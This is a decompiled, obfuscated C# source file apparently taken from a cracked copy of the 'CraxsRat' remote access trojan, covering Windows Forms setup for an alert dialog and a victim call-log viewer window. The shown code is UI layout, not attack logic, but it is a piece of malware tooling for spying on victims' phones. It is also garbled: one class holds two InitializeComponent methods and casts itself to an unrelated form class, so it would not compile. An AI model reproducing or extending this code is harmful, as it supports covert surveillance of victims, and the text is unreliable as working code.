// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.comptableform
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class comptableform : Form
  {
    public AsyncVoidMethodBuilder \u0024Builder;
    internal Form \u0024VB\u0024Local_o;
    internal int \u0024VB\u0024Local_interval;
    internal alertform \u0024VB\u0024Me;
    internal Form \u0024S0;
    internal Exception \u0024VB\u0024ResumableLocal_ex\u00241;
    internal TaskAwaiter \u0024A0;
    private IContainer components;

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.Panel1 = new Panel();
      this.loginbtn = new DrakeUIButtonIcon();
label_1:
      int num1 = -1481814202;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~-num1 + (-(1970944753 * 1385621309) + (2068902567 + 815956221 + ~283948531)))) % 47U)
        {
          case 0:
            this.loginbtn.Margin = new Padding(4);
            num1 = (int) num2 * 1599961218 ^ -359707843;
            continue;
          case 1:
            this.loginbtn.FillColor = Color.Transparent;
            num1 = (int) num2 * -1292277488 ^ 131422425;
            continue;
          case 2:
            this.PictureBox1.Location = new Point(0, 0);
            this.PictureBox1.Name = EXGuarder.\u00301770C59;
            num1 = (int) num2 * 628488790 ^ -2008584246;
            continue;
          case 3:
            this.loginbtn.RectHoverColor = Color.White;
            this.loginbtn.RectPressColor = Color.White;
            num1 = (int) num2 * -1720003735 ^ 1131042316;
            continue;
          case 4:
            this.loginbtn.Cursor = Cursors.Hand;
            num1 = (int) num2 * 1426038206 ^ -1769403568;
            continue;
          case 5:
            this.Label1.Location = new Point(0, 100);
            num1 = (int) num2 * 1124668797 ^ -876083194;
            continue;
          case 6:
            this.Label1 = new Label();
            this.Panel1.SuspendLayout();
            this.Panel2.SuspendLayout();
            num1 = (int) num2 * 1510683733 ^ 423460329;
            continue;
          case 7:
            this.Label1.Dock = DockStyle.Fill;
            num1 = (int) num2 * -2035623069 ^ 542695226;
            continue;
          case 8:
            this.Label1.Font = new Font(EXGuarder.\u00339482F40, 14f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            this.Label1.ForeColor = Color.Red;
            num1 = (int) num2 * 874033043 ^ 1432018611;
            continue;
          case 9:
            this.Panel2.TabIndex = 1;
            num1 = (int) num2 * -1996422382 ^ -1032360867;
            continue;
          case 10:
            this.ShowIcon = false;
            num1 = (int) num2 * -256284847 ^ -1806876301;
            continue;
          case 11:
            this.loginbtn.Radius = 10;
            num1 = (int) num2 * 1090722575 ^ -230928308;
            continue;
          case 12:
            this.loginbtn.RectSelectedColor = Color.White;
            num1 = (int) num2 * -1511444368 ^ -222514236;
            continue;
          case 13:
            this.Controls.Add((Control) this.Panel1);
            num1 = (int) num2 * 177024792 ^ 926251310;
            continue;
          case 14:
            goto label_1;
          case 15:
            this.Panel2.Location = new Point(0, 0);
            this.Panel2.Name = EXGuarder.\u00365551110;
            this.Panel2.Size = new Size(800, 100);
            num1 = (int) num2 * -1375121453 ^ 1017390919;
            continue;
          case 16:
            this.PictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
            this.PictureBox1.TabIndex = 0;
            this.PictureBox1.TabStop = false;
            num1 = (int) num2 * 1192174701 ^ -828248839;
            continue;
          case 17:
            this.Label1.Name = EXGuarder.\u003022F3F21;
            this.Label1.Size = new Size(800, 272);
            this.Label1.TabIndex = 2;
            this.Label1.Text = EXGuarder.\u003271A4738;
            this.Label1.TextAlign = ContentAlignment.MiddleCenter;
            this.AutoScaleDimensions = new SizeF(8f, 16f);
            this.AutoScaleMode = AutoScaleMode.Font;
            this.BackColor = Color.Black;
            this.ClientSize = new Size(800, 450);
            this.ControlBox = false;
            this.Controls.Add((Control) this.Label1);
            num1 = (int) num2 * 1177093930 ^ -586818258;
            continue;
          case 18:
            this.loginbtn.Name = EXGuarder.\u00350447708;
            num1 = (int) num2 * -1524319846 ^ -1970750217;
            continue;
          case 19:
            this.ForeColor = Color.White;
            num1 = (int) num2 * -1310113389 ^ 512077552;
            continue;
          case 20:
            this.loginbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1041660781 ^ -1767957717;
            continue;
          case 21:
            ((ISupportInitialize) this.PictureBox1).BeginInit();
            this.SuspendLayout();
            num1 = (int) num2 * 1613211668 ^ 1413178798;
            continue;
          case 22:
            this.Panel2.Controls.Add((Control) this.PictureBox1);
            this.Panel2.Dock = DockStyle.Top;
            num1 = (int) num2 * -894987626 ^ -1626595206;
            continue;
          case 23:
            this.loginbtn.Location = new Point(322, 23);
            num1 = (int) num2 * -236397433 ^ -1728524013;
            continue;
          case 24:
            this.StartPosition = FormStartPosition.CenterScreen;
            num1 = (int) num2 * -80598440 ^ -318330817;
            continue;
          case 25:
            this.Panel1.Dock = DockStyle.Bottom;
            num1 = (int) num2 * 260297551 ^ -826790247;
            continue;
          case 26:
            this.loginbtn.TabIndex = 29;
            this.loginbtn.Text = EXGuarder.\u003034C0960;
            num1 = (int) num2 * 477040798 ^ -424353809;
            continue;
          case 27:
            this.loginbtn.ForePressColor = Color.FromArgb(254, 0, 0);
            num1 = (int) num2 * 1386655088 ^ 1459711171;
            continue;
          case 28:
            this.Panel1.Controls.Add((Control) this.loginbtn);
            num1 = (int) num2 * -1271082167 ^ -461946774;
            continue;
          case 29:
            this.PictureBox1.Size = new Size(800, 100);
            num1 = (int) num2 * -838967109 ^ -187254553;
            continue;
          case 30:
            this.PictureBox1 = new PictureBox();
            num1 = (int) num2 * -41710450 ^ -944340210;
            continue;
          case 31:
            this.loginbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -1568834057 ^ 1101628701;
            continue;
          case 32:
            this.loginbtn.Style = UIStyle.Custom;
            this.loginbtn.SymbolSize = 0;
            num1 = (int) num2 * -796049415 ^ -137042293;
            continue;
          case 33:
            goto label_3;
          case 34:
            this.loginbtn.BackColor = Color.Transparent;
            num1 = (int) num2 * 1804167915 ^ 212511626;
            continue;
          case 35:
            this.PictureBox1.Image = (Image) Craxs_Rat.My.Resources.Resources.lie;
            num1 = (int) num2 * 1907907202 ^ 1418365940;
            continue;
          case 36:
            this.Panel1.ResumeLayout(false);
            num1 = (int) num2 * -941829339 ^ 1079839903;
            continue;
          case 37:
            this.Controls.Add((Control) this.Panel2);
            num1 = (int) num2 * 1587186668 ^ -792535325;
            continue;
          case 38:
            this.Panel2 = new Panel();
            num1 = (int) num2 * -591109213 ^ 198453907;
            continue;
          case 39:
            this.loginbtn.Size = new Size(156, 32);
            num1 = (int) num2 * -1709476911 ^ -1147469031;
            continue;
          case 40:
            this.Panel1.Location = new Point(0, 372);
            this.Panel1.Name = EXGuarder.\u0036C47035B;
            this.Panel1.Size = new Size(800, 78);
            this.Panel1.TabIndex = 0;
            num1 = (int) num2 * -1326394427 ^ 939911931;
            continue;
          case 41:
            this.Panel2.ResumeLayout(false);
            num1 = (int) num2 * 1207994034 ^ -1478600820;
            continue;
          case 42:
            this.Text = EXGuarder.\u00369604D4C;
            this.TopMost = true;
            num1 = (int) num2 * -1025293511 ^ -259161590;
            continue;
          case 43:
            this.FormBorderStyle = FormBorderStyle.None;
            this.Name = EXGuarder.\u00369604D4C;
            num1 = (int) num2 * -1863347084 ^ 948986077;
            continue;
          case 44:
            this.PictureBox1.Dock = DockStyle.Fill;
            num1 = (int) num2 * 1174039865 ^ -2102419361;
            continue;
          case 45:
            ((ISupportInitialize) this.PictureBox1).EndInit();
            this.ResumeLayout(false);
            num1 = (int) num2 * 289134306 ^ -1918860387;
            continue;
          case 46:
            this.loginbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
            this.loginbtn.FillPressColor = Color.Black;
            this.loginbtn.FillSelectedColor = Color.FromArgb(254, 0, 0);
            this.loginbtn.Font = new Font(EXGuarder.\u00339482F40, 12f);
            this.loginbtn.ForeColor = Color.FromArgb(254, 0, 0);
            num1 = (int) num2 * 2133856509 ^ -2103957966;
            continue;
          default:
            goto label_49;
        }
      }
label_3:
      return;
label_49:;
    }

    internal virtual Panel Panel1
    {
      get => ((craxscallslog) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((craxscallslog) this)._Panel1 = value;
    }

    internal virtual Panel Panel2
    {
      get => ((craxscallslog) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((craxscallslog) this)._Panel2 = value;
    }

    internal virtual DrakeUIButtonIcon loginbtn
    {
      get => ((craxscallslog) this)._loginbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Loginbtn_Click);
        DrakeUIButtonIcon loginbtn = ((craxscallslog) this)._loginbtn;
label_1:
        int num1 = 552324577;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-~(num1 - --(~(-1225234815 * -1522789800) * -734160585) - -616150013 * (1865507468 + 1604842816 + ~757308443 - ~-491480277 * -337435745) - --(1004163827 - 1351874129)) * -1949164977)) % 8U)
          {
            case 0:
              loginbtn.Click -= eventHandler;
              num1 = (int) num2 * 1578541883 ^ 311055794;
              continue;
            case 1:
              loginbtn.Click += eventHandler;
              num1 = (int) num2 * -1718887686 ^ -321696575;
              continue;
            case 2:
              goto label_1;
            case 3:
              goto label_3;
            case 4:
              ((craxscallslog) this)._loginbtn = value;
              num1 = -806706065;
              continue;
            case 5:
              int num3 = loginbtn == null ? 640152698 : (num3 = 436878790);
              num1 = num3 ^ (int) num2 * 1051979144;
              continue;
            case 6:
              int num4 = loginbtn == null ? 466013329 : (num4 = -712050489);
              num1 = num4 ^ (int) num2 * 430129751;
              continue;
            case 7:
              loginbtn = ((craxscallslog) this)._loginbtn;
              num1 = (int) num2 * 1086128898 ^ 1051275126;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual PictureBox PictureBox1
    {
      get => ((craxscallslog) this)._PictureBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((craxscallslog) this)._PictureBox1 = value;
      }
    }

    internal virtual Label Label1
    {
      get => ((craxscallslog) this)._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((craxscallslog) this)._Label1 = value;
    }

    private void Loginbtn_Click(object sender, EventArgs e) => this.Close();

    private void Comptableform_Load(object sender, EventArgs e)
    {
      string language = RegistryHandler.Get_Language();
label_1:
      int num1 = 250045550;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-1127620682 - (~(num2 * 555139629 - (2073151911 - -220413802) ^ -(677648485 - 1990465872) + (~-1596752297 + ~-887773043)) - (1784500385 - -395650544)))) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            this.Label1.Text = ((craxscallslog) this).cnmsg;
            num1 = (int) num3 * -305493645 ^ -1782939147;
            continue;
          case 3:
            num1 = (int) num3 * 2070290962 ^ -1181412396;
            continue;
          case 4:
            this.Label1.Text = ((craxscallslog) this).armsg;
            num1 = 646365588;
            continue;
          case 5:
            int num4 = Operators.CompareString(language, EXGuarder.\u0034A77771D, false) != 0 ? -1953704652 : (num4 = -489161311);
            num1 = num4 ^ (int) num3 * 2020048679;
            continue;
          case 6:
            int num5 = Operators.CompareString(language, EXGuarder.\u003085A2E1F, false) == 0 ? 1792861567 : (num5 = -1068411834);
            num1 = num5 ^ (int) num3 * 1616471964;
            continue;
          default:
            goto label_9;
        }
      }
label_3:
      return;
label_9:;
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = -2031071304;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ~(-(-((-(1085968288 - 134108791) ^ -(-623101183 - 888688388)) + (-(529850413 * -1211825205) ^ -1375199613 * (2101395998 ^ 1857836028))) - num2) * 1487315047 - ((-385392570 ^ 57672228) + (-95942096 - 1758875352)) ^ 1527338537 * -1609149887)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              int num4 = ((craxscallslog) this).components == null ? 1576611945 : (num4 = -1449915648);
              num1 = num4 ^ (int) num3 * -1838534817;
              continue;
            case 2:
              ((craxscallslog) this).components.Dispose();
              num1 = (int) num3 * 566225228 ^ -4209742;
              continue;
            case 3:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((craxscallslog) this).components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (craxscallslog));
label_1:
      int num1 = 84907;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(-num1 * 766410487 * 2064784143)) % 80U)
        {
          case 0:
            this.AutoScaleMode = AutoScaleMode.Font;
            num1 = (int) num2 * 1385488863 ^ 2128600377;
            continue;
          case 1:
            ((craxscallslog) this).DrakeUIButtonIcon1.Radius = 15;
            num1 = (int) num2 * 1694380944 ^ -36602717;
            continue;
          case 2:
            ((craxscallslog) this).Panel5.Controls.Add((Control) ((craxscallslog) this).callstext);
            num1 = (int) num2 * 1951242568 ^ 274940421;
            continue;
          case 3:
            ((craxscallslog) this).Panel2.Size = new Size(17, 287);
            ((craxscallslog) this).Panel2.TabIndex = 6;
            num1 = (int) num2 * 884024535 ^ -323042121;
            continue;
          case 4:
            ((craxscallslog) this).Panel2.Dock = DockStyle.Left;
            num1 = (int) num2 * -2128200912 ^ 74203905;
            continue;
          case 5:
            ((craxscallslog) this).checkbutton.Radius = 15;
            ((craxscallslog) this).checkbutton.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((craxscallslog) this).checkbutton.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * 210369742 ^ -1763848718;
            continue;
          case 6:
            ((craxscallslog) this).checkbutton.Cursor = Cursors.Hand;
            ((craxscallslog) this).checkbutton.FillColor = Color.Black;
            num1 = (int) num2 * 2119494716 ^ -441976849;
            continue;
          case 7:
            ((craxscallslog) this).Panel4.TabIndex = 8;
            num1 = (int) num2 * 547340224 ^ -1932652723;
            continue;
          case 8:
            ((craxscallslog) this).DrakeUIButtonIcon2.Name = EXGuarder.\u00309293378;
            num1 = (int) num2 * -1205436663 ^ -2055714449;
            continue;
          case 9:
            ((craxscallslog) this).Panel3.Dock = DockStyle.Right;
            num1 = (int) num2 * -836298631 ^ -1919852035;
            continue;
          case 10:
            ((craxscallslog) this).DrakeUIButtonIcon1.Name = EXGuarder.\u00314531444;
            num1 = (int) num2 * -1277617848 ^ -640910926;
            continue;
          case 11:
            ((craxscallslog) this).Panel3.Location = new Point(470, 133);
            ((craxscallslog) this).Panel3.Name = EXGuarder.\u0032D20556C;
            num1 = (int) num2 * -24743378 ^ 120162478;
            continue;
          case 12:
            ((craxscallslog) this).ToolTips.SetToolTip((Control) ((craxscallslog) this).DrakeUIButtonIcon2, EXGuarder.\u003092F6C04);
            ((craxscallslog) this).DrakeUIButtonIcon1.Cursor = Cursors.Hand;
            ((craxscallslog) this).DrakeUIButtonIcon1.FillColor = Color.Black;
            ((craxscallslog) this).DrakeUIButtonIcon1.Font = new Font(EXGuarder.\u0031A3F4F60, 12f);
            ((craxscallslog) this).DrakeUIButtonIcon1.Location = new Point(242, 96);
            num1 = (int) num2 * 2112109309 ^ -2093893649;
            continue;
          case 13:
            ((craxscallslog) this).Panel1.SuspendLayout();
            num1 = (int) num2 * 1899807228 ^ 375440031;
            continue;
          case 14:
            ((craxscallslog) this).DrakeUIButtonIcon2.Radius = 15;
            num1 = (int) num2 * -492196006 ^ 584342896;
            continue;
          case 15:
            ((craxscallslog) this).DrakeUIButtonIcon1.Style = UIStyle.Custom;
            ((craxscallslog) this).DrakeUIButtonIcon1.StyleCustomMode = true;
            ((craxscallslog) this).DrakeUIButtonIcon1.Symbol = 61639;
            ((craxscallslog) this).DrakeUIButtonIcon1.TabIndex = 2;
            ((craxscallslog) this).ToolTips.SetToolTip((Control) ((craxscallslog) this).DrakeUIButtonIcon1, EXGuarder.\u00321711E02);
            num1 = (int) num2 * 2000165755 ^ 767264330;
            continue;
          case 16:
            this.BackColor = Color.DarkRed;
            this.BackgroundImage = (Image) componentResourceManager.GetObject(EXGuarder.\u0035C112C58);
            this.BackgroundImageLayout = ImageLayout.Zoom;
            num1 = (int) num2 * 1916240717 ^ 663426384;
            continue;
          case 17:
            ((craxscallslog) this).Panel4.Dock = DockStyle.Bottom;
            num1 = (int) num2 * 504810495 ^ 1301386059;
            continue;
          case 18:
            ((craxscallslog) this).Panel5.Location = new Point(17, 133);
            ((craxscallslog) this).Panel5.Name = EXGuarder.\u003333A2030;
            num1 = (int) num2 * -622426709 ^ 325431525;
            continue;
          case 19:
            ((craxscallslog) this).checkbutton.Size = new Size(72, 30);
            num1 = (int) num2 * 625702293 ^ -760665063;
            continue;
          case 20:
            ((craxscallslog) this).DrakeUIButtonIcon2.Cursor = Cursors.Hand;
            num1 = (int) num2 * -1443936874 ^ 1926243680;
            continue;
          case 21:
            ((craxscallslog) this).Panel4.Name = EXGuarder.\u0035D1F6C0B;
            num1 = (int) num2 * -1695218207 ^ 704513336;
            continue;
          case 22:
            goto label_1;
          case 23:
            ((craxscallslog) this).callstext.ForeColor = Color.White;
            num1 = (int) num2 * 25180456 ^ 490948861;
            continue;
          case 24:
            ((craxscallslog) this).DrakeUIButtonIcon1.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * 1918644794 ^ 1515128942;
            continue;
          case 25:
            ((craxscallslog) this).ToolTips.SetToolTip((Control) ((craxscallslog) this).checkbutton, EXGuarder.\u003733F1D16);
            num1 = (int) num2 * -1725756967 ^ 1757915592;
            continue;
          case 26:
            ((craxscallslog) this).Panel5.Size = new Size(453, 266);
            ((craxscallslog) this).Panel5.TabIndex = 9;
            ((craxscallslog) this).Panel4.BackColor = Color.Transparent;
            num1 = (int) num2 * -540833083 ^ 1615993920;
            continue;
          case 27:
            ((craxscallslog) this).DrakeUIButtonIcon1 = new DrakeUIButtonIcon();
            ((craxscallslog) this).checkbutton = new DrakeUIButtonIcon();
            ((craxscallslog) this).Panel5 = new Panel();
            num1 = (int) num2 * 1828425635 ^ 958627319;
            continue;
          case 28:
            ((craxscallslog) this).callstext.Location = new Point(0, 0);
            num1 = (int) num2 * -1791868049 ^ 234694544;
            continue;
          case 29:
            ((craxscallslog) this).ToolTips = new DrakeUIToolTip(((craxscallslog) this).components);
            num1 = (int) num2 * 113859399 ^ -1321501531;
            continue;
          case 30:
            ((craxscallslog) this).Panel1.BackColor = Color.Transparent;
            ((craxscallslog) this).Panel1.Controls.Add((Control) ((craxscallslog) this).DrakeUIButtonIcon2);
            num1 = (int) num2 * -1645952697 ^ -1211549345;
            continue;
          case 31:
            this.ClientSize = new Size(487, 420);
            num1 = (int) num2 * -879537733 ^ -248448660;
            continue;
          case 32:
            this.Controls.Add((Control) ((craxscallslog) this).Panel5);
            num1 = (int) num2 * -69051785 ^ 848944878;
            continue;
          case 33:
            ((craxscallslog) this).callstext.TabIndex = 2;
            num1 = (int) num2 * 1480266617 ^ -654066322;
            continue;
          case 34:
            ((craxscallslog) this).callstext.Name = EXGuarder.\u00373057657;
            ((craxscallslog) this).callstext.ScrollBars = ScrollBars.Vertical;
            ((craxscallslog) this).callstext.Size = new Size(453, 266);
            num1 = (int) num2 * -1746324435 ^ 1693069320;
            continue;
          case 35:
            ((craxscallslog) this).callstext.Margin = new Padding(4);
            num1 = (int) num2 * 1687450477 ^ 810389803;
            continue;
          case 36:
            ((craxscallslog) this).Panel1.Controls.Add((Control) ((craxscallslog) this).DrakeUIButtonIcon1);
            num1 = (int) num2 * -761500748 ^ -736146576;
            continue;
          case 37:
            ((craxscallslog) this).checkbutton.Style = UIStyle.Custom;
            num1 = (int) num2 * -182410547 ^ 712188371;
            continue;
          case 38:
            ((craxscallslog) this).DrakeUIButtonIcon2.Location = new Point(320, 96);
            num1 = (int) num2 * -23406585 ^ -2016463301;
            continue;
          case 39:
            ((craxscallslog) this).DrakeUIButtonIcon2 = new DrakeUIButtonIcon();
            num1 = (int) num2 * 1252958164 ^ 865677888;
            continue;
          case 40:
            ((craxscallslog) this).DrakeUIButtonIcon2.Style = UIStyle.Custom;
            num1 = (int) num2 * 229805507 ^ -211038318;
            continue;
          case 41:
            ((craxscallslog) this).Panel1 = new Panel();
            num1 = (int) num2 * -235443334 ^ 1611107874;
            continue;
          case 42:
            ((craxscallslog) this).DrakeUIButtonIcon1.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1786466084 ^ -920353863;
            continue;
          case 43:
            ((craxscallslog) this).callstext.Multiline = true;
            num1 = (int) num2 * 1124326725 ^ 1805194956;
            continue;
          case 44:
            this.SuspendLayout();
            ((craxscallslog) this).callstext.BackColor = Color.Black;
            ((craxscallslog) this).callstext.BorderStyle = BorderStyle.None;
            ((craxscallslog) this).callstext.Dock = DockStyle.Fill;
            ((craxscallslog) this).callstext.Font = new Font(EXGuarder.\u0031A3F4F60, 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 1037053674 ^ 615254336;
            continue;
          case 45:
            this.Controls.Add((Control) ((craxscallslog) this).Panel4);
            num1 = (int) num2 * -165878402 ^ 1983121973;
            continue;
          case 46:
            ((craxscallslog) this).Panel5.ResumeLayout(false);
            num1 = (int) num2 * -1120727627 ^ -1792853119;
            continue;
          case 47:
            ((craxscallslog) this).Panel3.TabIndex = 7;
            ((craxscallslog) this).Panel2.BackColor = Color.Transparent;
            num1 = (int) num2 * -1537190341 ^ 1348117800;
            continue;
          case 48:
            this.ResumeLayout(false);
            num1 = (int) num2 * 1519489625 ^ 1607250171;
            continue;
          case 49:
            ((craxscallslog) this).checkbutton.Symbol = 61453;
            ((craxscallslog) this).checkbutton.TabIndex = 1;
            num1 = (int) num2 * 1475395141 ^ 245896511;
            continue;
          case 50:
            ((craxscallslog) this).callstext = new TextBox();
            num1 = (int) num2 * -2060499660 ^ 473696498;
            continue;
          case 51:
            ((craxscallslog) this).Panel4.Location = new Point(17, 399);
            num1 = (int) num2 * -1143451042 ^ -343482404;
            continue;
          case 52:
            ((craxscallslog) this).Panel4.Size = new Size(453, 21);
            num1 = (int) num2 * 592372579 ^ -692543628;
            continue;
          case 53:
            ((craxscallslog) this).Panel4 = new Panel();
            ((craxscallslog) this).Panel3 = new Panel();
            ((craxscallslog) this).Panel2 = new Panel();
            num1 = (int) num2 * -812173580 ^ -2062406646;
            continue;
          case 54:
            this.Text = EXGuarder.\u00335466F3F;
            ((craxscallslog) this).Panel1.ResumeLayout(false);
            num1 = (int) num2 * -845427625 ^ 1036576445;
            continue;
          case 55:
            this.Controls.Add((Control) ((craxscallslog) this).Panel2);
            this.Controls.Add((Control) ((craxscallslog) this).Panel1);
            this.DoubleBuffered = true;
            num1 = (int) num2 * 62676067 ^ -1793193435;
            continue;
          case 56:
            ((craxscallslog) this).DrakeUIButtonIcon2.TabIndex = 3;
            num1 = (int) num2 * -458445999 ^ -959788259;
            continue;
          case 57:
            ((craxscallslog) this).checkbutton.Location = new Point(398, 96);
            ((craxscallslog) this).checkbutton.Name = EXGuarder.\u00348343F70;
            num1 = (int) num2 * -834216975 ^ 1044328719;
            continue;
          case 58:
            ((craxscallslog) this).Panel5.SuspendLayout();
            num1 = (int) num2 * 522188821 ^ -1980736537;
            continue;
          case 59:
            this.Name = EXGuarder.\u00335466F3F;
            num1 = (int) num2 * 1013963925 ^ -50684472;
            continue;
          case 60:
            ((craxscallslog) this).Panel5.Dock = DockStyle.Fill;
            num1 = (int) num2 * 1081145992 ^ 12637963;
            continue;
          case 61:
            ((craxscallslog) this).DrakeUIButtonIcon2.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -854882056 ^ 245416759;
            continue;
          case 62:
            ((craxscallslog) this).checkbutton.Font = new Font(EXGuarder.\u0031A3F4F60, 12f);
            num1 = (int) num2 * 2063492323 ^ 1656704384;
            continue;
          case 63:
            ((craxscallslog) this).Panel1.Controls.Add((Control) ((craxscallslog) this).checkbutton);
            ((craxscallslog) this).Panel1.Dock = DockStyle.Top;
            ((craxscallslog) this).Panel1.Location = new Point(0, 0);
            ((craxscallslog) this).Panel1.Name = EXGuarder.\u00313283426;
            ((craxscallslog) this).Panel1.Size = new Size(487, 133);
            ((craxscallslog) this).Panel1.TabIndex = 5;
            num1 = (int) num2 * 1747128087 ^ -1951750924;
            continue;
          case 64:
            ((craxscallslog) this).Panel5.BackColor = Color.Black;
            num1 = (int) num2 * -1035298165 ^ 673781019;
            continue;
          case 65:
            ((craxscallslog) this).ToolTips.BackColor = Color.Black;
            ((craxscallslog) this).ToolTips.ForeColor = Color.White;
            num1 = (int) num2 * 2101738051 ^ -366049194;
            continue;
          case 66:
            goto label_3;
          case 67:
            ((craxscallslog) this).Panel3.Size = new Size(17, 287);
            num1 = (int) num2 * 1432258055 ^ -783153739;
            continue;
          case 68:
            ((craxscallslog) this).Panel3.BackColor = Color.Transparent;
            num1 = (int) num2 * 1845193604 ^ 740228666;
            continue;
          case 69:
            ((craxscallslog) this).Panel2.Name = EXGuarder.\u003523D7625;
            num1 = (int) num2 * -1455252510 ^ -736636274;
            continue;
          case 70:
            ((craxscallslog) this).DrakeUIButtonIcon2.Size = new Size(72, 30);
            num1 = (int) num2 * 2123428917 ^ -202341969;
            continue;
          case 71:
            ((craxscallslog) this).DrakeUIButtonIcon2.FillColor = Color.Black;
            ((craxscallslog) this).DrakeUIButtonIcon2.Font = new Font(EXGuarder.\u0031A3F4F60, 12f);
            num1 = (int) num2 * 544326575 ^ -868332906;
            continue;
          case 72:
            ((craxscallslog) this).Panel2.Location = new Point(0, 133);
            num1 = (int) num2 * 1721641370 ^ 821987798;
            continue;
          case 73:
            ((craxscallslog) this).DrakeUIButtonIcon2.Symbol = 61544;
            num1 = (int) num2 * -2004527196 ^ -768149019;
            continue;
          case 74:
            this.Controls.Add((Control) ((craxscallslog) this).Panel3);
            num1 = (int) num2 * -1984713629 ^ 840332790;
            continue;
          case 75:
            ((craxscallslog) this).DrakeUIButtonIcon2.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -599724419 ^ -1786295823;
            continue;
          case 76:
            ((craxscallslog) this).ToolTips.OwnerDraw = true;
            ((craxscallslog) this).ToolTips.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.AutoScaleDimensions = new SizeF(8f, 16f);
            num1 = (int) num2 * -534384338 ^ -2076014255;
            continue;
          case 77:
            ((craxscallslog) this).DrakeUIButtonIcon1.Size = new Size(72, 30);
            num1 = (int) num2 * -887301084 ^ -1413867356;
            continue;
          case 78:
            ((craxscallslog) this).Panel5.PerformLayout();
            num1 = (int) num2 * -1341320955 ^ 1180295631;
            continue;
          case 79:
            this.FormBorderStyle = FormBorderStyle.None;
            num1 = (int) num2 * -976958764 ^ -203232224;
            continue;
          default:
            goto label_82;
        }
      }
label_3:
      return;
label_82:;
    }
  }
}
